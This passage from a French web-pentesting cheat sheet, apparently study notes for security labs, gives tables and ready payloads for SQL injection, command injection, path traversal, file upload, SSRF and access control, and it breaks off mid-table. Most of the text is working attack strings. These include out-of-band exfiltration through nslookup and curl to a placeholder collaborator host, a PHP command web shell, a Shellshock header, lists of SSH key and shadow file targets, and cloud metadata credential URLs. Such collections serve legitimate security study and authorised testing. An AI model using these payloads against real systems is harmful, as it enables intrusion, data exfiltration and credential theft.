-- SQL-O1 hors bande microsoft xp_dirtree
'; exec master..xp_dirtree '//<COLLAB>/a'-- -
-- SQL-O4 hors bande microsoft exfiltration
'; DECLARE @p VARCHAR(99); SET @p=(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'); EXEC('master..xp_dirtree "//'+@p+'.<COLLAB>/a"')-- -
```

**PostgreSQL**

```sql
-- SQL-O2 hors bande postgresql copy
'; copy (SELECT '') to program 'nslookup <COLLAB>'-- -
```

**MySQL et MariaDB**

```sql
-- SQL-O6 hors bande mysql load_file
' AND LOAD_FILE(CONCAT('\\\\',(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'),'.<COLLAB>\\a'))-- -
```

### SQL injection - Fichiers et contournement de filtre

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SQL-F1 | Lecture de fichier, MySQL | Contenu du fichier dans la page | Privilège FILE et variable secure_file_priv |
| SQL-F2 | Lecture de fichier, PostgreSQL | Contenu du fichier dans la page | Superutilisateur ou rôle dédié |
| SQL-F3 | Lecture de fichier, Microsoft | Contenu du fichier dans la page | Droits d'administration |
| SQL-F4 | Écriture de fichier, MySQL | Fichier créé à l'emplacement visé | Mêmes prérequis que SQL-F1 ; choisir un nom neutre |
| SQL-F5 | Écriture de fichier, PostgreSQL | Fichier créé à l'emplacement visé | Mêmes prérequis que SQL-F2 |
| SQL-X1 | Filtre sur la casse ou sur le mot UNION | Requête acceptée | Casse mélangée |
| SQL-X2 | Filtre sur les mots-clés ou les espaces | Requête acceptée | Commentaire en ligne, tabulation ou saut de ligne à la place de l'espace |
| SQL-X3 | Filtre sur les guillemets | Requête acceptée | Valeur hexadécimale à la place de la chaîne |

**Lecture et écriture de fichiers**

```sql
-- SQL-F1 fichier lecture mysql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
-- SQL-F2 fichier lecture postgresql
' UNION SELECT pg_read_file('/etc/passwd'),NULL-- -
-- SQL-F3 fichier lecture microsoft
' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK '<CHEMIN>', SINGLE_CLOB) AS x-- -
-- SQL-F4 fichier ecriture mysql
' UNION SELECT '<VALEUR>',NULL INTO OUTFILE '<CHEMIN>'-- -
-- SQL-F5 fichier ecriture postgresql
'; COPY (SELECT '<VALEUR>') TO '<CHEMIN>'-- -
```

À utiliser uniquement dans un environnement autorisé et isolé : ces fonctions sortent du cadre des labs habituels.

**Contournement de filtre**

```sql
-- SQL-X1 filtre casse
' UnIoN SeLeCt NULL,NULL-- -
-- SQL-X2 filtre commentaire en ligne
' UN/**/ION SEL/**/ECT NULL,NULL-- -
-- SQL-X2 filtre espace remplace
'/**/UNION/**/SELECT/**/NULL,NULL-- -
-- SQL-X2 filtre espace saut de ligne
'%0aUNION%0aSELECT%0aNULL,NULL-- -
-- SQL-X2 filtre espace tabulation
'%09UNION%09SELECT%09NULL,NULL-- -
-- SQL-X3 filtre guillemets hexadecimal
' UNION SELECT NULL,NULL FROM <TABLE> WHERE username=0x61646d696e-- -
```

Dans un corps XML, encoder les caractères du payload en entités XML pour passer un filtre ; un double encodage d'URL est aussi à essayer.

Équivalent de LIMIT 1 pour obtenir une seule ligne : `ROWNUM=1` sur Oracle, `TOP 1` sur Microsoft, `LIMIT 1` sur MySQL, PostgreSQL et SQLite.

## Command injection

Note détaillée : [[Command-injection]] ; fiches : [[Command-injection]]

**Quand l'utiliser** : une valeur envoyée à l'application finit dans une commande exécutée par un interpréteur de commandes (valeur de paramètre, en-tête, nom de fichier).
**Détection** : envoyer un séparateur suivi d'une commande inoffensive ; observer la sortie, un délai ou une interaction réseau. Le séparateur ne fonctionne que si la commande passe par un interpréteur.

Encodage utile dans une URL : `&` en `%26`, `;` en `%3b`, `|` en `%7c`, saut de ligne en `%0a`, espace en `+` ou `%20`.

### Command injection - Détection et sortie visible

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| CMD-1 | Valeur hors guillemets, sortie renvoyée | Le nom du compte apparaît dans la réponse | La sortie doit être affichée |
| CMD-2 | Test neutre | Le marqueur apparaît dans la réponse | Le second esperluette isole la suite de la commande d'origine ; un filtre peut retirer la sortie |
| CMD-3 | Consommer la valeur d'origine | Résultat de la commande injectée | Le tube passe la sortie de la première commande à la seconde |
| CMD-4 | Unix, séparateur point-virgule | Identifiant du compte dans la réponse | Le point-virgule est parfois filtré |
| CMD-5 | Unix, substitution de commande | Identifiant du compte dans la réponse | Valable entre guillemets doubles, pas entre guillemets simples |
| CMD-6 | Valeur entre guillemets | Identifiant du compte dans la réponse | Fermer le guillemet puis le rouvrir ; une erreur de syntaxe du shell révèle le contexte |
| CMD-7 | Windows, cmd | Version du système | `ver` est interne à cmd |
| CMD-8 | Windows, variable d'environnement | Nom du compte courant | Peut différer du résultat de whoami pour un service |

**Commun à Unix et Windows**

```text
# CMD-1 injection simple sortie visible
1|whoami
# CMD-2 detection marqueur
& echo <MARQUEUR> &
# CMD-3 tube
|whoami
```

**Unix**

```bash
# CMD-4 point virgule
; id
# CMD-5 substitution
$(id)
# CMD-5 substitution
`id`
# CMD-6 guillemet simple
'; id; '
# CMD-6 guillemet double
"; id; "
```

**Windows (cmd)**

```text
# CMD-7 version
& ver &
# CMD-8 variable
& echo %USERNAME% &
```

### Command injection - Séparateurs

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| CMD-9 | Séparateurs à essayer en premier | La commande injectée s'exécute | La sémantique dépend du code de retour de la commande d'origine pour la double esperluette et le double tube |
| CMD-10 | Point-virgule et saut de ligne | La commande injectée s'exécute | Valables sous Unix ; le point-virgule l'est aussi sous PowerShell, pas sous cmd |
| CMD-11 | Retour chariot | La commande injectée s'exécute | Selon l'interpréteur |

**Unix et Windows (cmd)**

```text
# CMD-9 separateur esperluette
&
# CMD-9 separateur double esperluette
&&
# CMD-9 separateur tube
|
# CMD-9 separateur double tube
||
```

**Unix**

```text
# CMD-10 separateur point virgule
;
# CMD-10 separateur saut de ligne
%0a
# CMD-11 separateur retour chariot
%0d%0a
```

**Windows (PowerShell)**

```text
# CMD-10 separateur point virgule
;
```

### Command injection - Délai

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| CMD-12 | Unix, le plus direct | Réponse plus lente d'environ dix secondes | Comparer avec un temps de référence mesuré plusieurs fois |
| CMD-13 | Unix, sleep filtré | Environ dix secondes | L'option est propre à Unix ; 127.0.0.1 évite toute sortie réseau |
| CMD-14 | Windows, ping | Environ neuf à dix secondes | La première requête est immédiate |
| CMD-15 | Windows, timeout | Environ dix secondes | Refuse parfois une entrée redirigée |
| CMD-16 | PowerShell | Environ dix secondes | Seulement si PowerShell est l'interpréteur |

Pour contrôler, refaire avec cinq puis dix secondes : le temps doit suivre la valeur. Une réponse qui dépasse le délai de Burp doit être attendue.

**Unix**

```bash
# CMD-12 delai sleep
& sleep 10 &
# CMD-13 delai ping unix
& ping -c 10 127.0.0.1 &
```

**Windows (cmd)**

```text
# CMD-14 delai ping windows
& ping -n 10 127.0.0.1 &
# CMD-15 delai timeout
& timeout /t 10 &
```

**Windows (PowerShell)**

```text
# CMD-16 delai start-sleep
; Start-Sleep 10;
```

### Command injection - Redirection de sortie

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| CMD-17 | Unix, répertoire web inscriptible connu | Contenu de la sortie dans la réponse du GET | Trouver un répertoire servi (images ou fichiers statiques vus dans le trafic) ; le fichier reste en place, choisir un nom neutre |
| CMD-18 | Capturer aussi les erreurs | Texte d'erreur éventuellement lisible | Même contrainte que CMD-17 |
| CMD-19 | Windows, racine web | Lecture du fichier par GET | Chemins différents, par exemple sous inetpub |

Après la redirection, lire le fichier avec `GET <CHEMIN>/<FICHIER>.txt`.

**Unix**

```bash
# CMD-17 redirection unix
& whoami > /var/www/static/<FICHIER>.txt &
# CMD-18 redirection avec erreurs
& id > <CHEMIN>/<FICHIER>.txt 2>&1 &
```

**Windows (cmd)**

```text
# CMD-19 redirection windows
& whoami > C:\<CHEMIN>\<FICHIER>.txt &
```

### Command injection - Hors bande

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| CMD-20 | Prouver l'exécution sans sortie | Requête DNS reçue côté serveur d'interaction | Sortie DNS nécessaire ; nslookup peut manquer sur des images Unix minimales |
| CMD-21 | Exfiltrer une courte valeur, Unix | Valeur dans le sous-domaine reçu | 63 caractères au plus par étiquette, sans espace ni symbole |
| CMD-22 | Exfiltrer une variable, Windows | Nom dans la requête reçue | Pas de guillemets inversés sous cmd ; pour une commande, utiliser une boucle for /f |
| CMD-23 | Interaction HTTP | Requête HTTP reçue | HTTP sortant souvent bloqué, DNS souvent autorisé |
| CMD-24 | Valeur plus longue par HTTP | Valeur codée dans le chemin | Petites quantités seulement |

Pour relever les interactions, voir [[#Outils Burp - Collaborator]].

**Unix et Windows (cmd)**

```text
# CMD-20 hors bande interaction dns
& nslookup <COLLAB> &
```

**Unix**

```bash
# CMD-21 hors bande exfiltration guillemets inverses
& nslookup `whoami`.<COLLAB> &
# CMD-21 hors bande exfiltration substitution
& nslookup $(whoami).<COLLAB> &
# CMD-23 hors bande http curl
& curl http://<COLLAB>/ &
# CMD-23 hors bande http wget
& wget http://<COLLAB>/ &
# CMD-24 hors bande http exfiltration
& curl http://<COLLAB>/`id|base64 -w0` &
```

**Windows (cmd)**

```text
# CMD-22 hors bande exfiltration variable
& nslookup %USERNAME%.<COLLAB> &
```

### Command injection - Contournement de filtre

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| CMD-25 | Unix, espace filtré | La commande s'exécute | Les accolades dépendent de Bash, IFS dépend du shell |
| CMD-26 | Unix, mot filtré | La commande s'exécute | Efficace si le filtre est naïf |
| CMD-27 | Unix, barre oblique filtrée | Le chemin est reconstruit | Bash |
| CMD-28 | Windows cmd, mot filtré | La commande s'exécute | cmd seulement |
| CMD-29 | Windows, espace filtré | L'espace est reconstruit | Dépend de la variable ; fragile |
| CMD-30 | Filtre appliqué avant le décodage | Le séparateur passe | Selon la chaîne de traitement |

**Unix**

```bash
# CMD-25 espace filtre ifs
cat${IFS}/etc/passwd
# CMD-25 espace filtre ifs
cat$IFS$9/etc/passwd
# CMD-25 espace filtre accolades
{cat,/etc/passwd}
# CMD-25 espace filtre tabulation
cat%09/etc/passwd
# CMD-26 mot filtre guillemet simple
w'h'oami
# CMD-26 mot filtre guillemet double
w"h"oami
# CMD-26 mot filtre antislash
who\ami
# CMD-27 barre oblique filtree
${PATH:0:1}
```

**Windows (cmd)**

```text
# CMD-28 mot filtre accent circonflexe
who^ami
# CMD-29 espace filtre variable
%PROGRAMFILES:~10,1%
```

**Commun à Unix et Windows**

```text
# CMD-30 encodage url
%26
# CMD-30 double encodage
%252f
```

## Path traversal

Note détaillée : [[Path-traversal]] ; fiches : [[Path-traversal-cas-simple]], [[Path-traversal-chemin-absolu]], [[Path-traversal-sequences-et-encodage]], [[Path-traversal-prefixe-et-extension]]

**Quand l'utiliser** : une valeur envoyée par l'utilisateur sert de nom ou de chemin de fichier, par exemple un paramètre de type nom de fichier.
**Détection** : relever la valeur normale, une valeur inexistante, puis une valeur de traversée, et comparer le code, la taille et le contenu de la réponse. Des séquences en trop restent sans effet à la racine.

Dans les payloads, le paramètre s'écrit `<PARAM>=<valeur>` ; seule la valeur est donnée. Avec curl, utiliser `--path-as-is` ; dans le navigateur, la barre d'adresse normalise les séquences. Dans Burp, contrôler la requête brute réellement envoyée : la saisie peut ré-encoder `%25`.

### Path traversal - Séquences simples

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| PTH-1 | Linux, aucune validation | Lignes de la forme `root:x:0:0:` dans le corps | Le Content-Type peut rester celui d'une image ; lire le corps |
| PTH-2 | Séquence en trop | Même résultat que PTH-1 | Les séquences en excès sont sans effet |
| PTH-3 | Windows | Contenu de win.ini | L'antislash peut aussi être encodé |

**Unix**

```text
# PTH-1 traversee simple unix
../../../etc/passwd
# PTH-2 traversee simple unix sequence en trop
../../../../etc/passwd
```

**Windows**

```text
# PTH-3 traversee simple windows
..\..\..\windows\win.ini
# PTH-3 traversee windows antislash encode
..%5c..%5c..%5cwindows%5cwin.ini
# PTH-3 traversee windows antislash double encodage
..%255c..%255c..%255cwindows%255cwin.ini
```

### Path traversal - Séquences imbriquées

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| PTH-4 | Un seul passage de suppression de la séquence | Contenu du fichier, alors que la forme simple échoue | Inefficace si la suppression est récursive |
| PTH-5 | Même cas, avec antislash | Contenu du fichier | Sur Windows |

**Unix**

```text
# PTH-4 sequences imbriquees
....//
# PTH-4 sequences imbriquees complet
....//....//....//etc/passwd
# PTH-4 sequences imbriquees variante
..././..././..././etc/passwd
```

**Windows**

```text
# PTH-5 sequences imbriquees antislash
....\/
# PTH-5 sequences imbriquees antislash complet
....\/....\/....\/etc/passwd
# PTH-5 sequences imbriquees windows
....\\....\\....\\windows\\win.ini
```

### Path traversal - Encodages

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| PTH-6 | Filtre avant un décodage | Forme brute refusée, forme encodée acceptée | Encodage simple |
| PTH-7 | Filtre suivi de deux décodages | Contenu du fichier | Encoder le seul `/` est souvent plus fiable |
| PTH-8 | Décodeur ancien ou normalisation Unicode | Contenu du fichier | Rare sur les piles récentes |

Une erreur différente entre la forme brute et la forme encodée indique déjà où se trouve le filtre.

**Encodage simple**

```text
# PTH-6 encodage simple
%2e%2e%2f
# PTH-6 encodage simple complet
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
# PTH-6 encodage simple barre oblique
..%2f..%2f..%2fetc/passwd
```

**Double encodage**

```text
# PTH-7 double encodage
%252e%252e%252f
# PTH-7 double encodage complet
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
# PTH-7 double encodage barre oblique
..%252f..%252f..%252fetc/passwd
```

**Encodage non standard**

```text
# PTH-8 encodage non standard
..%c0%af
# PTH-8 encodage non standard complet
..%c0%af..%c0%af..%c0%afetc/passwd
# PTH-8 encodage unicode
..%ef%bc%8f
# PTH-8 encodage unicode complet
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

### Path traversal - Chemin absolu

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| PTH-9 | La séquence est bloquée mais la valeur sert de chemin telle quelle | Contenu du fichier alors que la forme avec séquences est refusée | Échoue si l'application ajoute toujours un préfixe |

```text
# PTH-9 chemin absolu unix
/etc/passwd
# PTH-9 chemin absolu windows
C:\windows\win.ini
# PTH-9 chemin absolu windows
/windows/win.ini
```

### Path traversal - Préfixe

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| PTH-10 | L'application vérifie que la valeur commence par le répertoire de base | Contenu du fichier | Reprendre exactement la base vue dans une requête normale ; échoue si l'application canonise avant de comparer |
| PTH-11 | Préfixe imposé et suppression non récursive | Contenu du fichier | Combinaison de PTH-10 et PTH-4 |

```text
# PTH-10 prefixe impose
/var/www/images/../../../etc/passwd
# PTH-11 prefixe et sequences imbriquees
/var/www/images/....//....//....//etc/passwd
```

### Path traversal - Extension et octet nul

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| PTH-12 | L'application exige une extension donnée | Fichier lu malgré l'extension | Utiliser une extension déjà vue dans les requêtes normales ; ne fonctionne plus sur les piles récentes, à essayer en dernier |

```text
# PTH-12 extension octet nul png
../../../etc/passwd%00.png
# PTH-12 extension octet nul jpg
../../../etc/passwd%00.jpg
```

### Path traversal - Fichiers cibles

La lecture dépend des droits du processus. La traversée lit un fichier, pas un répertoire.

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| PTH-13 | Preuve de lecture, Linux | Contenu du fichier | Fichiers présents sur presque tout système |
| PTH-14 | Contexte du processus, Linux | Variables ou ligne de commande | Utile pour trouver des chemins et des secrets |
| PTH-15 | Configuration et application, Linux | Fichiers de configuration | Chemin de l'application à déduire |
| PTH-16 | Identifiants, Linux | Clé ou condensat | `/etc/shadow` est en général illisible sans privilèges élevés |
| PTH-17 | Windows | Contenu du fichier | Chemins de IIS pour les fichiers de configuration |

**Linux**

```text
# PTH-13 fichier cible preuve
/etc/passwd
# PTH-13 fichier cible preuve
/etc/hosts
# PTH-13 fichier cible preuve
/etc/hostname
# PTH-13 fichier cible preuve
/etc/os-release
# PTH-13 fichier cible preuve
/proc/version
# PTH-14 fichier cible processus
/proc/self/environ
# PTH-14 fichier cible processus
/proc/self/cmdline
# PTH-15 fichier cible configuration
/etc/nginx/nginx.conf
# PTH-15 fichier cible configuration
/etc/apache2/apache2.conf
# PTH-16 fichier cible identifiants
/home/<UTILISATEUR>/.ssh/id_rsa
# PTH-16 fichier cible identifiants
/root/.ssh/id_rsa
# PTH-16 fichier cible identifiants
/etc/shadow
```

**Windows**

```text
# PTH-17 fichier cible windows
C:\windows\win.ini
# PTH-17 fichier cible windows
C:\windows\system32\drivers\etc\hosts
# PTH-17 fichier cible iis
C:\inetpub\wwwroot\web.config
# PTH-17 fichier cible iis
C:\windows\system32\inetsrv\config\applicationHost.config
# PTH-17 fichier cible ancien
C:\boot.ini
```

La liste Burp dédiée à la traversée est décrite dans [[#Outils Burp - Intruder]].

## File upload

Note détaillée : [[File-upload]] ; fiches : [[File-upload-web-shell]], [[File-upload-validation-content-type]], [[File-upload-liste-noire]]

**Quand l'utiliser** : l'application accepte un fichier de l'utilisateur et le range dans un répertoire où le serveur exécute les scripts.
**Détection** : téléverser un fichier inoffensif, retrouver son adresse de service dans l'historique du proxy (filtre Images), puis voir si le dossier exécute les scripts.

### File upload - Web shells

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| FUP-1 | Lecture d'un fichier précis | Contenu du fichier dans la réponse | Web shell PHP minimal |
| FUP-2 | Exécution de commandes | Sortie de la commande dans la réponse | Web shell PHP polyvalent |
| FUP-3 | Appel du fichier téléversé | La réponse contient la sortie du script, pas son code | Depuis Repeater, remplacer le nom du fichier de l'URL de service par celui du script ; un texte brut signifie que le dossier n'exécute pas |

**PHP**

```text
# FUP-1 web shell lecture fichier
<?php echo file_get_contents('/home/<UTILISATEUR>/secret'); ?>
# FUP-2 web shell commande
<?php system($_GET['command']); ?>
# FUP-3 appel du web shell
GET <CHEMIN>/<FICHIER>.php?command=id
```

### File upload - Type MIME

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| FUP-4 | Refus mentionnant des types MIME autorisés | Réponse de succès, puis exécution à l'appel | Modifier le Content-Type de la partie fichier du corps multipart, jamais celui de la requête principale (il porte la limite du multipart) |

```text
# FUP-4 type mime partie fichier
Content-Type: image/jpeg
```

### File upload - Techniques de contournement

Aucun payload consigné pour l'instant (contournement d'extension, fichier de configuration, traversée dans le nom, signature de contenu, concurrence). Les techniques s'ajoutent ici une par une, avec le même gabarit, au fur et à mesure de l'étude.

## SSRF

Note détaillée : [[SSRF]] ; fiches : [[SSRF-serveur-local]], [[SSRF-systemes-back-end]], [[SSRF-filtre-liste-noire]], [[SSRF-filtre-liste-blanche]], [[SSRF-redirection-ouverte]], [[SSRF-aveugle]], [[SSRF-surfaces-cachees]]

**Quand l'utiliser** : l'application récupère une adresse fournie ou influençable par l'utilisateur (paramètre contenant une URL, en-tête, import, génération de document).
**Détection** : comparer la réponse pour la valeur d'origine, l'hôte local et un hôte inexistant ; une interaction DNS reçue confirme que le serveur résout l'adresse.

Dans les payloads, le paramètre s'écrit `<PARAM>=<valeur>` ; seule la valeur est donnée quand le paramètre est évident.

### SSRF - Cibles locales

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SSR-1 | Serveur local | Contenu de l'interface d'administration | Bloqué si un filtre vise le mot localhost |
| SSR-2 | Autre port local | Réponse différente selon le port | Balayage lent |
| SSR-3 | Chemins sensibles | Réponse différente de 404 | Dépend de la technologie |
| SSR-4 | Système back-end | Voir la section Balayage interne | Le paramètre contient l'URL complète |

```text
# SSR-1 ssrf serveur local
<PARAM>=http://localhost/admin
# SSR-1 ssrf serveur local forme numerique
<PARAM>=http://127.0.0.1/admin
# SSR-2 ssrf serveur local port
http://localhost:<N>/admin
# SSR-3 ssrf serveur local chemin
http://localhost/console
# SSR-3 ssrf serveur local chemin
http://localhost/actuator
# SSR-4 ssrf systeme back-end
<PARAM>=http://192.168.0.1:8080/admin
```

Pour SSR-2, les ports courants sont 80, 8080, 8000 et 8443. Dans le HTML de l'interface trouvée, relever l'URL de l'action à déclencher : elle se rejoue avec la même méthode (souvent GET).

### SSRF - Balayage interne

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SSR-5 | Dernier octet inconnu | Un seul statut différent, souvent 200 | Intruder, payload Numbers de 1 à 255 ; trier par statut |
| SSR-6 | Autres plages privées | Statut ou durée différents | Espace à balayer large |
| SSR-7 | Port inconnu | Statut ou durée différents | Bruit élevé |
| SSR-8 | Aucune réponse visible | Rapide avec erreur : hôte atteint ; lent : hôte filtré | Interprétation incertaine |

```text
# SSR-5 balayage dernier octet
http://192.168.0.§1§:8080/admin
# SSR-6 balayage plage 10
http://10.0.0.§1§/
# SSR-6 balayage plage 172
http://172.16.0.§1§/
# SSR-7 balayage ports
http://192.168.0.1:§80§/
```

### SSRF - Représentations d'adresse

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SSR-9 | Liste noire qui bloque 127.0.0.1 | La page d'accueil s'affiche | Le client HTTP doit accepter la forme abrégée |
| SSR-10 | Même cas, forme décimale | Idem | Dépend de l'analyseur du serveur |
| SSR-11 | Même cas, octal et hexadécimal | Idem | Certains analyseurs ne lisent pas l'octal |
| SSR-12 | Même cas, IPv6 | Idem | Le service doit écouter en IPv6 |
| SSR-13 | Même cas, adresse nulle | Idem | Comportement variable selon le système |

```text
# SSR-9 adresse abregee
http://127.1/
# SSR-10 adresse decimale
http://2130706433/
# SSR-11 adresse octale
http://017700000001/
# SSR-11 adresse hexadecimale
http://0x7f000001/
# SSR-12 adresse ipv6
http://[::1]/
# SSR-13 adresse nulle
http://0/
# SSR-13 adresse nulle
http://0.0.0.0/
```

### SSRF - Contournement de liste noire

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SSR-14 | Chemin bloqué | Le chemin passe | Double encodage d'une lettre ; suppose un décodage en deux temps |
| SSR-15 | Chemin bloqué | Le chemin passe | Encodage simple ; souvent décodé aussi par le filtre |
| SSR-16 | Chemin bloqué | Le chemin passe | Variation de casse ; chemins sensibles à la casse sur beaucoup de serveurs |
| SSR-17 | Nom qui résout vers 127.0.0.1 | Page locale | Domaine d'exemple de la documentation PortSwigger ; son comportement peut changer |
| SSR-18 | Redirection depuis une URL contrôlée | La redirection est suivie | Codes 301, 302, 303 ou 307 ; le client doit suivre les redirections |

```text
# SSR-14 chemin double encodage
http://127.1/%2561dmin
# SSR-15 chemin encodage simple
http://127.1/%61dmin
# SSR-16 chemin casse
http://127.1/ADMIN
# SSR-17 nom resolvant vers le bouclage
http://spoofed.burpcollaborator.net/
# SSR-17 nom resolvant vers le bouclage autre service
http://127.0.0.1.nip.io/
```

### SSRF - Contournement de liste blanche

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SSR-19 | Le filtre lit la partie avant l'arobase comme l'hôte | Requête acceptée et arrivée sur l'hôte réel | Dépend de la différence d'analyse entre filtre et client |
| SSR-20 | Même idée, avec mot de passe factice | Idem | Idem |
| SSR-21 | Le filtre cherche la valeur attendue n'importe où | Acceptée si le fragment n'est pas traité par le filtre | Beaucoup de filtres bloquent le dièse |
| SSR-22 | Filtre sur préfixe ou sous-chaîne | Acceptée si la correspondance est lâche | Nécessite un domaine contrôlé |
| SSR-23 | Divergence de décodage entre filtre et client | Acceptée une fois encodée, refusée en clair | Dépend du nombre de décodages |

```text
# SSR-19 liste blanche arobase
https://<HOTEATTENDU>@<HOTEEXTERNE>/
# SSR-20 liste blanche identifiants
https://<HOTEATTENDU>:fakepassword@<HOTEEXTERNE>
# SSR-21 liste blanche fragment
https://<HOTEEXTERNE>#<HOTEATTENDU>
# SSR-22 liste blanche sous-domaine
https://<HOTEATTENDU>.<HOTEEXTERNE>
# SSR-23 liste blanche encodage arobase et dieze
http://localhost:80%2523@<HOTEATTENDU>/admin
```

### SSRF - Redirection ouverte

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SSR-24 | Chemin relatif accepté par le filtre, redirection ouverte via un paramètre de l'application | Page interne renvoyée | Le client doit suivre la redirection |
| SSR-25 | Test préalable de la redirection | Interaction ou en-tête Location | Vérifie que la redirection mène vers un domaine externe |

```text
# SSR-24 redirection ouverte vers hote interne
<PARAM>=/product/nextProduct?path=http://192.168.0.12:8080/admin
# SSR-25 redirection ouverte test externe
<CHEMIN>/redirect?url=http://<COLLAB>
```

### SSRF - Aveugle

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SSR-26 | Logiciel d'analyse qui récupère le Referer | Interactions DNS puis HTTP | Traitement asynchrone : attendre puis relever les interactions |
| SSR-27 | Paramètre contenant une URL, sans réponse visible | Interaction DNS et HTTP | Dans les labs, serveur public par défaut seulement |
| SSR-28 | En-têtes que le serveur peut résoudre | Interaction DNS | Dépend de l'infrastructure |
| SSR-29 | Cible interne par l'en-tête | Effets de bord seulement | Aveugle ; balayer le dernier octet |
| SSR-30 | Balayage avec une charge dans un en-tête de navigateur | Interaction reçue avec le nom d'utilisateur en sous-domaine | Charge de type injection de commande par en-tête ; adresse interne dans le Referer |

Un DNS seul sans requête HTTP peut indiquer un filtrage du HTTP sortant ou une simple validation préalable.

```text
# SSR-26 aveugle referer
Referer: http://<COLLAB>
# SSR-27 aveugle parametre url
<PARAM>=http://<COLLAB>/
# SSR-28 aveugle en-tete host
Host: <COLLAB>
# SSR-28 aveugle en-tete forwarded host
X-Forwarded-Host: <COLLAB>
# SSR-29 aveugle referer interne
Referer: http://192.168.0.<N>:8080/
# SSR-29 aveugle host interne
Host: <HOTE>
# SSR-30 aveugle charge dans user-agent
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).<COLLAB>
```

Pour relever les interactions, voir [[#Outils Burp - Collaborator]]. Autres surfaces : champ XML, webhook, génération de PDF.

### SSRF - Métadonnées cloud

Cible réelle seulement, hors programme des labs habituels. Preuve minimale : ne pas extraire en masse des données sensibles.

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SSR-31 | AWS, métadonnées version 1 | Liste de clés | La version 2 exige un jeton obtenu par PUT, souvent infaisable en GET seul |
| SSR-32 | AWS, identifiants du rôle | Nom du rôle puis identifiants temporaires | Données très sensibles |
| SSR-33 | Google Cloud | Réponse seulement avec l'en-tête Metadata-Flavor | En-tête non contrôlable via une SSRF simple |
| SSR-34 | Azure | Réponse seulement avec l'en-tête Metadata | Idem |
| SSR-35 | Autres schémas | Lecture de fichier ou octets bruts | Rarement acceptés par le client |

```text
# SSR-31 metadonnees aws
http://169.254.169.254/latest/meta-data/
# SSR-32 metadonnees aws identifiants
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# SSR-33 metadonnees google
http://metadata.google.internal/computeMetadata/v1/
# SSR-33 metadonnees google en-tete
Metadata-Flavor: Google
# SSR-34 metadonnees azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# SSR-34 metadonnees azure en-tete
Metadata: true
# SSR-35 schema fichier
file://
# SSR-35 schema gopher
gopher://
# SSR-35 schema dict
dict://
```

## Access control

Note détaillée : [[Access-control]] ; fiches : [[Access-control-fonctionnalite-non-protegee]], [[Access-control-parametre-utilisateur]], [[Access-control-escalade-horizontale]], [[Access-control-idor]], [[Access-control-contournement-plateforme]], [[Access-control-processus-multi-etapes-et-referer]]

**Quand l'utiliser** : une fonction ou une donnée doit être réservée à un rôle ou à un propriétaire, et le contrôle est faible ou absent.
**Détection** : rejouer chaque requête sensible sans session, avec une session de faible privilège et avec une session d'administrateur, puis comparer le statut et la longueur. Lire aussi le corps des réponses de redirection.

### Access control - Accès direct

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| ACC-1 | Fonction d'administration non liée dans l'interface | Contenu d'administration (statut 200) | Une page peut s'afficher sans que l'action soit autorisée : tester l'action |
| ACC-2 | Cartographie initiale | Chemins sensibles listés | Le fichier peut être vide ou factice ; regarder aussi le JavaScript et les commentaires HTML |
| ACC-3 | Corps d'une réponse de redirection | Données sensibles dans le corps | Le navigateur masque le corps : utiliser Burp |

```text
# ACC-1 acces direct
/admin
# ACC-1 acces direct
/administrator
# ACC-1 acces direct
/manage
# ACC-1 acces direct
/console
# ACC-2 cartographie robots
/robots.txt
# ACC-2 cartographie sitemap
/sitemap.xml
```

### Access control - Paramètres et cookies

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| ACC-4 | Rôle contrôlable côté client dans la chaîne de requête | Changement de contenu ou de droits | Dépend du nom exact du paramètre |
| ACC-5 | Cookie en clair portant un drapeau de rôle | Fonction d'administration accessible | Échoue si le cookie est signé ou chiffré |
| ACC-6 | Réponse JSON qui montre déjà un champ de rôle | Champ accepté, rôle changé | Affectation de masse ; le serveur peut ignorer les champs inconnus |
| ACC-7 | Filtrage par format de contenu | Champ pris en compte | Passer du JSON au formulaire |
| ACC-8 | Jeton de session | Champ de rôle lisible | Base64 ou JWT ; la signature empêche la modification |

```text
# ACC-4 parametre role
?admin=true
# ACC-4 parametre role
?role=1
# ACC-4 parametre role
?role=admin
# ACC-4 parametre role
?isAdmin=1
# ACC-5 cookie role
Cookie: Admin=true
# ACC-6 affectation de masse json
"roleid":2
# ACC-6 affectation de masse json
"role":"admin"
```

### Access control - Identifiants

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
